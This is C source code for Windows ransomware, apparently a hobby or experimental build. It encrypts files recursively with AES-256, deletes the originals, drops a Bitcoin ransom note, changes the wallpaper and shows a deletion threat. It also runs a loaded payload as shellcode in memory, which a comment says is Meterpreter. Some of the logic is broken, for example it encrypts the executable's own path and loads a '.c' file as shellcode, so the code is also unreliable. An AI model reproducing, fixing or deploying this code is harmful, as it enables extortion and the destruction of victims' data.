#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winbase.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <shlobj.h>

#define MAKELANG_NEUTRAL SUBLANG_NEUTRAL
#define AES_BLOCK_SIZE 16

// Function declarations
void generate_key(unsigned char *key, int key_len);
void inject_payload(unsigned char *payload, size_t payload_len);
void encrypt_file(const char *filename, unsigned char *key);
void encrypt_directory(const char *directory, unsigned char *key);
void drop_ransom_note(const char *desktop_path);
void start_timer();
void change_wallpaper(const char *wallpaper_path);

// Function to generate a random key
void generate_key(unsigned char *key, int key_len) {
    if (RAND_bytes(key, key_len) != 1) {
        perror("Error generating key");
        exit(1);
    }
}

// Function to inject and execute Meterpreter payload in memory
void inject_payload(unsigned char *payload, size_t payload_len) {
    void *exec_mem;
    HANDLE thread;
    DWORD oldprotect = 0;

    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (exec_mem == NULL) {
        perror("VirtualAlloc failed");
        return;
    }

    RtlMoveMemory(exec_mem, payload, payload_len);
    if (GetLastError() != ERROR_SUCCESS) {
        perror("RtlMoveMemory failed");
        return;
    }

    VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
    if (GetLastError() != ERROR_SUCCESS) {
        perror("VirtualProtect failed");
        return;
    }

    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
    if (thread == NULL) {
        perror("CreateThread failed");
        return;
    }

    WaitForSingleObject(thread, INFINITE);
    if (GetLastError() != ERROR_SUCCESS) {
        perror("WaitForSingleObject failed");
        return;
    }
}

// Function to encrypt files using AES-256 (with IV and padding handling)
void encrypt_file(const char *filename, unsigned char *key) {
    FILE *input = fopen(filename, "rb");
    if (!input) return;

    char output_filename[MAX_PATH];
    snprintf(output_filename, MAX_PATH, "%s.locked", filename);

    FILE *output = fopen(output_filename, "wb");
    if (!output) {
        fclose(input);
        return;
    }

    unsigned char iv[AES_BLOCK_SIZE];
    if (RAND_bytes(iv, AES_BLOCK_SIZE) != 1) {
        perror("Error generating IV");
        fclose(input);
        fclose(output);
        remove(output_filename);
        return;
    }

    fwrite(iv, 1, AES_BLOCK_SIZE, output);

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);

    unsigned char buffer[AES_BLOCK_SIZE * 10];
    unsigned char encrypted[AES_BLOCK_SIZE * 20];
    int len;
    int outlen;

    while (1) {
        size_t read_bytes = fread(buffer, 1, sizeof(buffer), input);
        if (read_bytes == 0) break;

        if (!EVP_EncryptUpdate(ctx, encrypted, &outlen, buffer, read_bytes)) {
            perror("Error encrypting file");
            fclose(input);
            fclose(output);
            EVP_CIPHER_CTX_free(ctx);
            return;
        }
        fwrite(encrypted, 1, outlen, output);
    }

    if (!EVP_EncryptFinal_ex(ctx, encrypted, &len)) {
        perror("Error finalizing encryption");
        fclose(input);
        fclose(output);
        EVP_CIPHER_CTX_free(ctx);
        return;
    }
    fwrite(encrypted, 1, len, output);

    EVP_CIPHER_CTX_free(ctx);
    fclose(input);
    fclose(output);
    remove(filename);
}

// Function to traverse directories and encrypt files
void encrypt_directory(const char *directory, unsigned char *key) {
    WIN32_FIND_DATA findData;
    char searchPath[MAX_PATH];
    snprintf(searchPath, MAX_PATH, "%s\\*", directory);

    HANDLE hFind = FindFirstFile(searchPath, &findData);

    if (hFind == INVALID_HANDLE_VALUE) {
        perror("Error opening directory");
        return;
    }

    do {
        char full_path[MAX_PATH];
        snprintf(full_path, MAX_PATH, "%s\\%s", directory, findData.cFileName);

        if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0) {
            continue;
        }

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            encrypt_directory(full_path, key);
        } else {
            encrypt_file(full_path, key);
        }
    } while (FindNextFile(hFind, &findData) != 0);

    FindClose(hFind);
}

// Function to drop a ransom note
void drop_ransom_note(const char *desktop_path) {
    char ransom_note_path[MAX_PATH];
    snprintf(ransom_note_path, MAX_PATH, "%s\\READ_ME.txt", desktop_path);

    FILE *note = fopen(ransom_note_path, "w");
    if (note) {
        fprintf(note, "Your files are encrypted! Send 0.01 BTC to: 1FakeBitcoinAddressXYZ");
        fclose(note);
    } else {
        perror("Error creating ransom note");
    }
}

// Function to start a 24-hour timer
void start_timer() {
    Sleep(86400000);
    MessageBox(NULL, "Your files will be deleted in 24 hours if payment is not made!", "WARNING", MB_OK | MB_ICONWARNING);
}

// Function to change the wallpaper
void change_wallpaper(const char *wallpaper_path) {
    if (wallpaper_path == NULL || strlen(wallpaper_path) == 0) {
        return;
    }

    wchar_t w_wallpaper_path[MAX_PATH];
    int len = MultiByteToWideChar(CP_UTF8, 0, wallpaper_path, -1, w_wallpaper_path, MAX_PATH);
    if (len == 0) {
        perror("MultiByteToWideChar failed");
        return;
    }

    BOOL result = SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, w_wallpaper_path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);

    if (!result) {
        DWORD error = GetLastError();
        fprintf(stderr, "SystemParametersInfoW failed with error code: %lu\n", error);

        LPSTR message = NULL;
        FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
            NULL, error, MAKELANG_NEUTRAL, (LPSTR)&message, 0, NULL);

        if (message != NULL) {
            fprintf(stderr, "Error message: %s\n", message);
            LocalFree(message);
        }

    } else {
      printf("Wallpaper set successfully!\n");
    }
}

int main() {
    unsigned char aes_key[32];
    generate_key(aes_key, 32);

    unsigned char *payload = NULL;
    size_t payload_len = 0;

    // 1. Open payload.c
    FILE *payload_file = fopen("payload.c", "rb");
    if (!payload_file) {
        perror("Error opening payload.c");
        return 1;
    }

    // 2. Get file size and allocate memory
    fseek(payload_file, 0, SEEK_END);
    payload_len = ftell(payload_file);
    fseek(payload_file, 0, SEEK_SET);

    payload = (unsigned char *)malloc(payload_len + 1);
    if (!payload) {
        perror("malloc failed");
        fclose(payload_file);
        return 1;
    }

    // 3. Read payload
    size_t bytes_read = fread(payload, 1, payload_len, payload_file);
    if (bytes_read != payload_len) {
        perror("fread failed");
        free(payload);
        fclose(payload_file);
        return 1;
    }

    fclose(payload_file);

    // 4. Handle potential null terminator
    if (payload[payload_len - 1] == '\0') {
        payload_len--;
    }

    // *** DECLARE THESE VARIABLES ***
    char exe_path[MAX_PATH];
    if (GetModuleFileName(NULL, exe_path, MAX_PATH) == 0) {
        perror("Error getting EXE path");
        free(payload); // Free payload memory on error
        return 1;
    }

    char *last_slash = strrchr(exe_path, '\\');
    if (last_slash == NULL) {
        perror("Invalid EXE path");
        free(payload); // Free payload memory on error
        return 1;
    }

    char wallpaper_path[MAX_PATH];
    snprintf(wallpaper_path, MAX_PATH, "%.*s\\wallpaper.jpg", (int)(last_slash - exe_path + 1), exe_path);

    printf("Wallpaper path: %s\n", wallpaper_path);

    change_wallpaper(wallpaper_path);
    encrypt_directory(exe_path, aes_key);
    drop_ransom_note(exe_path);
    start_timer();

    printf("Injecting payload...\n");
    inject_payload(payload, payload_len);

    free(payload); // Free the payload memory

    return 0;
}